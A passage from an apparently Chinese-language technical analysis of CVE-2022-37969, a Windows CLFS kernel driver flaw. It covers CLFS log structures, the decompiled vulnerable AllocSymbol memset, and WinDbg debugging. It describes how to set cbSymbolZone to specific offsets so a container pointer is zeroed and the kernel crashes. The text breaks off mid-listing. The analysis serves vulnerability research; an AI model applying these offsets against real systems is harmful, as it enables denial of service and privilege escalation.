cFreeContainers;</span></span><span style="display:flex;"><span> ULONG cActiveContainers;</span></span><span style="display:flex;"><span> ULONG cbFreeContainers;</span></span><span style="display:flex;"><span> ULONG cbBusyContainers;</span></span><span style="display:flex;"><span> ULONG rgClients[MAX_CLIENTS_DEFAULT];</span></span><span style="display:flex;"><span> ULONG rgContainers[MAX_CONTAINERS_DEFAULT];</span></span><span style="display:flex;"><span> ULONG cbSymbolZone;</span></span><span style="display:flex;"><span> ULONG cbSector;</span></span><span style="display:flex;"><span> USHORT bUnused;</span></span><span style="display:flex;"><span> CLFS_LOG_STATE eLogState;</span></span><span style="display:flex;"><span> UCHAR cUsn;</span></span><span style="display:flex;"><span> UCHAR cClients;</span></span><span style="display:flex;"><span>} CLFS_BASE_RECORD_HEADER,<span style="color:#f92672">*</span> PCLFS_BASE_RECORD_HEADER;</span></span></code></pre></div><p>内存布局：</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/2.png"/></p><p>此次漏洞重点字段：</p><ul><li><p>rgContainers</p><p>存储了<code>CLFS_CONTAINER_CONTEXT</code>数组相对于基本块的偏移</p></li><li><p>rgClients</p><p>存储了<code>_CLFS_CLIENT_CONTEXT</code> 数组相对于基本块的偏移</p></li><li><p>cbSymbolZone</p><p>表示符号区中下一个可用的空闲偏移量，用于存储新符号。</p></li></ul><p>基本记录中，client context, container context, shared security context由symbols表示，在symbols前面是<code>CLFSHASHSYM</code>结构</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_NODE_ID {</span></span><span style="display:flex;"><span> ULONG cType;</span></span><span style="display:flex;"><span> ULONG cbNode;</span></span><span style="display:flex;"><span>} CLFS_NODE_ID,<span style="color:#f92672">*</span>PCLFS_NODE_ID;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFSHASHSYM</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_NODE_ID cidNode;</span></span><span style="display:flex;"><span> ULONG ulHash;</span></span><span style="display:flex;"><span> ULONG cbHash;</span></span><span style="display:flex;"><span> ULONGLONG ulBelow;</span></span><span style="display:flex;"><span> ULONGLONG ulAbove;</span></span><span style="display:flex;"><span> LONG cbSymName;</span></span><span style="display:flex;"><span> LONG cbOffset;</span></span><span style="display:flex;"><span> BOOLEAN fDeleted;</span></span><span style="display:flex;"><span>} CLFSHASHSYM,<span style="color:#f92672">*</span>PCLFSHASHSYM;</span></span></code></pre></div><p>内存布局</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/3.png"/></p><p>在基本记录中，client context标示一个日志文件的client。client context结构如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_NODE_ID {</span></span><span style="display:flex;"><span> ULONG cType;</span></span><span style="display:flex;"><span> ULONG cbNode;</span></span><span style="display:flex;"><span>} CLFS_NODE_ID,<span style="color:#f92672">*</span>PCLFS_NODE_ID;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_CLIENT_CONTEXT</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_NODE_ID cidNode;</span></span><span style="display:flex;"><span> CLFS_CLIENT_ID cidClient;</span></span><span style="display:flex;"><span> USHORT fAttributes;</span></span><span style="display:flex;"><span> ULONG cbFlushThreshold;</span></span><span style="display:flex;"><span> ULONG cShadowSectors;</span></span><span style="display:flex;"><span> ULONGLONG cbUndoCommitment;</span></span><span style="display:flex;"><span> LARGE_INTEGER llCreateTime;</span></span><span style="display:flex;"><span> LARGE_INTEGER llAccessTime;</span></span><span style="display:flex;"><span> LARGE_INTEGER llWriteTime;</span></span><span style="display:flex;"><span> CLFS_LSN lsnOwnerPage;</span></span><span style="display:flex;"><span> CLFS_LSN lsnArchiveTail;</span></span><span style="display:flex;"><span> CLFS_LSN lsnBase;</span></span><span style="display:flex;"><span> CLFS_LSN lsnLast;</span></span><span style="display:flex;"><span> CLFS_LSN lsnRestart;</span></span><span style="display:flex;"><span> CLFS_LSN lsnPhysicalBase;</span></span><span style="display:flex;"><span> CLFS_LSN lsnUnused1;</span></span><span style="display:flex;"><span> CLFS_LSN lsnUnused2;</span></span><span style="display:flex;"><span> CLFS_LOG_STATE eState;<span style="color:#75715e">//+0x78</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">union</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> HANDLE hSecurityContext;</span></span><span style="display:flex;"><span> ULONGLONG ullAlignment;</span></span><span style="display:flex;"><span> };</span></span><span style="display:flex;"><span>} CLFS_CLIENT_CONTEXT,<span style="color:#f92672">*</span>PCLFS_CLIENT_CONTEXT;</span></span></code></pre></div><p>container context结构和日志文件添加容器有关，container context结构</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_NODE_ID cidNode;<span style="color:#75715e">//8 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONGLONG cbContainer;<span style="color:#75715e">//8 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_CONTAINER_ID cidContainer;<span style="color:#75715e">// 4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_CONTAINER_ID cidQueue;<span style="color:#75715e">// 4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">union</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> CClfsContainer<span style="color:#f92672">*</span> pContainer;<span style="color:#75715e">//8 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONGLONG ullAlignment;</span></span><span style="display:flex;"><span> };</span></span><span style="display:flex;"><span> CLFS_USN usnCurrent;</span></span><span style="display:flex;"><span> CLFS_CONTAINER_STATE eState;</span></span><span style="display:flex;"><span> ULONG cbPrevOffset;<span style="color:#75715e">//4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ULONG cbNextOffset;<span style="color:#75715e">//4 bytes</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>} CLFS_CONTAINER_CONTEXT,<span style="color:#f92672">*</span>PCLFS_CONTAINER_CONTEXT;</span></span></code></pre></div><p>内存布局</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/4.png"/></p><p>其中pContainer是指向CClfsContainer对象的指针</p><p><strong>漏洞点</strong></p><p>该处获取通过<code>GetBaseLogRecord</code>函数获取<code>BaseLogRecord</code>，之后的<code>cbSymbolZone</code>，判断cbSymbolZone+v4是否大于SignaturesOffset的，如果判断通过则通过memset将BaseLogRecord+cbSymbolZone内存清零，大小为v4。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">AllocSymbol</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v4;<span style="color:#75715e">// rbp</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>BaseLogRecord;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// r8 this指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>v7;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">*</span>v8;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> cbSymbolZone;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>v10;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> result;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> cbSymbolZone<span style="color:#f92672">=</span> BaseLogRecord<span style="color:#f92672">-></span>cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone<span style="color:#f92672">+</span> v4<span style="color:#f92672">></span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>v8<span style="color:#f92672">+</span> v8<span style="color:#f92672">-></span>SignaturesOffset) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225507</span>i64;</span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=.........</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p.......</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y......</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffff970a`4995b070 05 00 00 00 00 00 00 00-aa fb b6 33 fa f9 ed 11 ...........3....</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v10,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v4);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">-></span>cbSymbolZone<span style="color:#f92672">+=</span> v4;</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span> v10;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>Windows 10 21H2</li><li>windbg</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p>基于该漏洞点有两种利用方式，第一种将<code>cbSymbolZone</code>修改为自身的<code>CLFS_CONTAINER_CONTEXT->pContainer</code>结构偏移，由于<code>CLFS_CONTAINER_CONTEXT</code>内存有<code>Container context</code>对象指针。使用<code>memset</code>清空该指针，当解引用该指针将触发异常，导致蓝屏。</p><p>第二种将<code>cbSymbolZone</code> 修改为下个BLF文件的<code>CLFS_CONTAINER_CONTEXT->pContainer</code>结构偏移，利用漏洞将该指针清零，解引用第二个BLF文件的<code>CLFS_CONTAINER_CONTEXT->pContainer</code> 将导致蓝屏，这种方式利用需要绕过<code>(char *)&amp;BaseLogRecord[1] + cbSymbolZone + v4 > (char *)(&amp;v8+ v8->SignaturesOffset)</code></p><p><strong>第一种利用方式</strong></p><p>在调试中发现<code>CLFS_CONTAINER_CONTEXT</code>结构距离<code>CLFS_BASE_RECORD_HEADER</code>结束为0x128，<code>pContainer</code>指针距离<code>CLFS_BASE_RECORD_HEADER</code>为0x130，此处要清空高四位（内核解引用指针会校验指针是否为NULL，所以不能把所有的位都清零），则应设为144。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffff970a4995c4d0</span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4d0<span style="color:#ae81ff">00000030</span><span style="color:#960050;background-color:#1e0010">`</span>c1fdf008<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">80000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4e0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">45f</span><span style="color:#ae81ff">7</span>cd40</span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4f0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c500<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c510<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c520<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c530<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c540<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rr8</span></span><span style="display:flex;"><span>r8<span style="color:#f92672">=</span><span style="color:#ae81ff">000000000000000</span>c</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rrdi</span></span><span style="display:flex;"><span>rdi<span style="color:#f92672">=</span>ffff970a4995b070</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>ffff970a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4995</span>c4d0<span style="color:#f92672">-</span>ffff970a4995b070</span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">5216</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001460</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001460</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x1338</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">296</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000012</span><span style="color:#ae81ff">8</span></span></span></code></pre></div><p>在<code>clfs!CClfsBaseFilePersisted::AllocSymbol</code>下断点，运行PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>bp clfs<span style="color:#f92672">!</span>CClfsBaseFilePersisted::AllocSymbol</span></span></code></pre></div><p><code>CLFS!CClfsBaseFilePersisted::AllocSymbol</code>通过调用<code>CLFS!CClfsBaseFile::GetBaseLogRecord</code>获取到了基本记录头，可以看到<code>_CLFS_BASE_RECORD_HEADER→cbSymbolZone</code>已被设为144</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> db rax</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f383070 05 00 00 00 00 00 00 00<span style="color:#f92672">-</span>a1 a9 21 b4 31 0f ee 11 ..........<span style="color:#f92672">!</span>.<span style="color:#a6e22e">1</span>...</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f383080 bc 69 00 0c 29 07 fc 32<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 .<span style="color:#a6e22e">i</span>..)..<span style="color:#a6e22e">2</span>........</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f383090 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830a0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830b0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830c0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>38 13 00 00 00 00 00 00 ........<span style="color:#a6e22e">8</span>.......</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830d0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3830e0 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">+</span> 0x1328</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384398 44 01 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 03 01 01 00 00 00 D...............</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843a8 06 f0 fd c1 30 00 00 00<span style="color:#f92672">-</span>16 00 d2 02 b8 00 00 00 ....<span style="color:#a6e22e">0</span>...........</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843b8 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843c8 f0 13 00 00 68 13 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ....<span style="color:#a6e22e">h</span>...........</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843d8 07 f0 fd c1 88 00 00 00<span style="color:#f92672">-</span>00 00 00 01 40 9c 00 00 ............<span style="color:#960050;background-color:#1e0010">@</span>...</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843e8 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3843f8 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384408 00 00 00 00 00 00 00 00<span style="color:#f92672">-</span>00 00 00 00 ff ff ff ff ................</span></span></code></pre></div><p>而后对<code>BaseLogRecord+0x1338+cbSymbolZone</code>处大小为v4的内存调用memset清零</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile::GetBaseLogRecord(<span style="color:#66d9ef">this</span>);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> 3222929421i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span> 48)<span style="color:#f92672">+</span> 48i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span> 0i64;</span></span><span style="display:flex;"><span> cbSymbolZone<span style="color:#f92672">=</span> BaseLogRecord<span style="color:#f92672">-></span>cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span><span style="color:#f92672">+</span> cbSymbolZone<span style="color:#f92672">+</span> v4<span style="color:#f92672">></span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>v8<span style="color:#f92672">-></span>MajorVersion<span style="color:#f92672">+</span> v8<span style="color:#f92672">-></span>SignaturesOffset) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> 3221225507i64;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span><span style="color:#f92672">+</span> cbSymbolZone;</span></span><span style="display:flex;"><span> memset(v10, 0, (unsigned<span style="color:#66d9ef">int</span>)v4);</span></span></code></pre></div><p>在调试器中可以看到rcx指向了<code>CLFS_CONTAINER_CONTEXT->pContainer</code> 的高四位。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> dd rcx<span style="color:#f92672">-</span> 0x1c</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844d0 c1fdf008 00000030 00080000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844e0 00000000 00000000 4bd8b7c0 ffffbd84</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844f0 00000001 00000002 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384500 003f005c 005c003f 003a0043 0055005c</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384510 00650073 00730072 0050005c 00620075</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384520 0069006c 005c0063 0063002e 006e006f</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384530 00610074 006e0069 00720065 0031005f</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384540 00310034 00000000 00000000 00000000</span></span><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> u</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted::AllocSymbol<span style="color:#f92672">+</span>0x67:</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0207 e874c8fcff call CLFS<span style="color:#f92672">!</span>memset (fffff801<span style="color:#960050;background-color:#1e0010">`</span>2709ca80)</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d020c 01af28130000 add dword ptr<span style="color:#f92672">[</span>rdi<span style="color:#f92672">+</span>1328h<span style="color:#f92672">]</span>,ebp</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0212 33c0 xor eax,eax</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0214 48891e mov qword ptr<span style="color:#f92672">[</span>rsi<span style="color:#f92672">]</span>,rbx</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0217 488b5c2430 mov rbx,qword ptr<span style="color:#f92672">[</span>rsp<span style="color:#f92672">+</span>30h<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d021c 488b6c2438 mov rbp,qword ptr<span style="color:#f92672">[</span>rsp<span style="color:#f92672">+</span>38h<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0221 488b742440 mov rsi,qword 